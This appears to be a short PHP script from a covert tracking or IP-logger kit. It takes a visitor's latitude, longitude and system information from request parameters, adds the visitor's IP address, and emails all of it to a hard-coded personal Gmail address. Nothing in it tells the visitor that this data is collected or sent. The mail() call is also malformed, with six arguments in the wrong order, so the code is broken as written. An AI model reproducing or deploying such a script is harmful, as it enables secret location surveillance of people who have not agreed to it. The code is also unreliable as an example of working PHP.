<?php

$mailto = "po1795009@gmail.com";
$lat = "Latitude: " . $_GET["Latitude"];
$lon = "Longitude: " . $_GET["Longitude"];
$ip = "\nIP: " . $_SERVER["REMOTE_ADDR"];
$info = "\nSysInfo" . $_GET["SysInfo"];
$error = "hallo ther wae an error in this program";

mail($mailto, $lat, $lon, $ip, $info, $error);
?>
